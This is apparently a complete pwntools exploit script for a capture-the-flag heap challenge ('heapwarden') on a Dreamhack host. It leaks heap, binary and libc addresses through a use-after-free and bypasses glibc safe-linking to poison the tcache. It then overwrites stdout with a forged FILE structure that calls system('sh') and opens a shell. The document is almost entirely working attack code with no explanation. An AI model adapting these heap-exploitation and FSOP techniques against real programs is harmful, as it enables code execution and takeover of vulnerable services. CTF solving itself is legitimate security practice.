#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './heapwarden')
libc = ELF('./libc.so.6')

def make(size, data=b'', initialize=False):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b': ', str(size).encode())

    if not initialize: io.sendlineafter(b': ', b'0') ; return
    if data == b'': data = randoms(size).encode()
    io.sendlineafter(b': ', str(len(data)).encode())
    io.send(data)

def free(idx):
  io.sendlineafter(b'> ', b'2')
  io.sendlineafter(b': ', str(idx).encode())
  if io.recvline().strip() == b'ok': return True
  else: return False

def edit(idx, offset=0, data=b''):
  io.sendlineafter(b'> ', b'3')
  io.sendlineafter(b': ', str(idx).encode())
  io.sendlineafter(b': ', str(offset).encode())
  io.sendlineafter(b': ', str(len(data)).encode())
  io.send(data)

def show(idx, offset=0, nbytes=0x10):
  io.sendlineafter(b'> ', b'4')
  io.sendlineafter(b': ', str(idx).encode())
  io.sendlineafter(b': ', str(offset).encode())
  io.sendlineafter(b': ', str(nbytes).encode())
  return unhex(io.recvline().strip())

def demangle(val):
  mask = 0xfff << 52
  while mask:
    v = val & mask
    val ^= (v >> 12)
    mask >>= 12
  return val

io = remote('host3.dreamhack.games', 8689)

mapping = {}
for i in range(0x140-5): print(i) ; make(0x100, f'heap_{i}'.encode(), True)

free(0)
for i in range(1, 0x140-5):  
  print(i)
  data = show(i)
  if b'heap' not in data: 
    mapping[0] = i
    heap_base = (u64(data[:8])<<12) - (((0x110*mapping[0])>>12)<<12)
    break

free(1)
for i in range(2, 0x140-5):
  print(i)
  if b'heap' not in show(i) and i != mapping[0]: mapping[1] = i ; break

edit(mapping[1], data=p64((heap_base+0x10)^((heap_base+0x4a0+(0x110*mapping[1]))>>12)))
make(0x100)
make(0x100)
edit(0x140-4, offset=0x1e, data=p8(1))
edit(0x140-4, offset=0xf8, data=p64(heap_base+0x2d0))

make(0x100)
edit(0x140-3, offset=0xb8, data=p64(0x50|1))
exe.address = (u64(show(0x140-4, offset=0xf8, nbytes=8))^(heap_base>>12)) - 0x1b00

edit(0x140-4, offset=0x1e, data=p8(1))
edit(0x140-4, offset=0xf8, data=p64(exe.address+0x4060))
make(0x100, p64(0) + p32(2)*2, True)
edit(0x140-4, offset=0x1e, data=p8(7))
free(3)
libc.address = u64(show(2, nbytes=8)) - 0x21ace0

edit(0x140-4, offset=0x1e, data=p8(1))
edit(0x140-4, offset=0xf8, data=p64(libc.sym._IO_2_1_stdout_))

fs = flat(
    {
        0x00: b"  sh",
        0x08: p64(0),
        0x20: p64(0),
        0x28: p64(1),
        0x68: libc.sym.system,
        0x88: libc.address+0x21ca70,
        0xa0: libc.sym._IO_2_1_stdout_-0x10,
        0xc0: p64(0),
        0xd0: libc.sym._IO_2_1_stdout_,
        0xd8: libc.symbols["_IO_wfile_jumps"]-0x20,
    },
    filler=b'\x00'
)

make(0x100, fs, True)
io.interactive()
